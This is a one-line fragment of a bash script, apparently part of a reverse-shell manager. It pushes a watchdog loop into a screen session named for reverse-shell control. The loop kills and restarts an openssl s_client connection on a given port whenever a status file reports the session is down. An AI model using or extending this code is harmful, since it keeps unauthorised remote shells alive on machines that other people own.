...
screen -S reverseshellControl_$cname -X stuff "if [[ \$(cat $installdir/$cname/screens_$cname) = *'0'* ]]; then echo restarting session...;ps aux | grep s_client | grep $rport | xargs kill -9;fi; done"`echo -ne '\015'`
